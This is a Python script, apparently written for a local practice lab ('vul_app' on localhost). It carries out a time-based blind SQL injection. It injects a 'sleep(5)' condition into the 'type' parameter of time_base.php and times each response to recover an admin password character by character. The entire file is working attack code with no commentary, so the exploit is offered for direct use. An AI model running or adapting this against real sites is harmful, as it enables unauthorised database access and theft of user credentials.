import requests
import string
import urllib.parse
cookies = {
    'PHPSESSID': 'v18gssa5se8a3gvooqedfl6bk1',
}

headers = {
    'Host': 'localhost',
    'Cache-Control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close',
    # 'Cookie': 'PHPSESSID=v18gssa5se8a3gvooqedfl6bk1',
}
tables = string.ascii_lowercase
pwd_admin = ""
while True:
    for i in tables:
        t = f"'  and (select sleep(5) from users where USERNAME LIKE '%admin%' and PASSWORD like '{pwd_admin+i}%')#"
        t = urllib.parse.quote(t)
        response = requests.get(f'http://localhost/vul_app/time_base.php?type={t}', cookies=cookies, headers=headers, verify=False)
        if response.elapsed.total_seconds() > 5:
            pwd_admin+=i
            print(pwd_admin)
            break

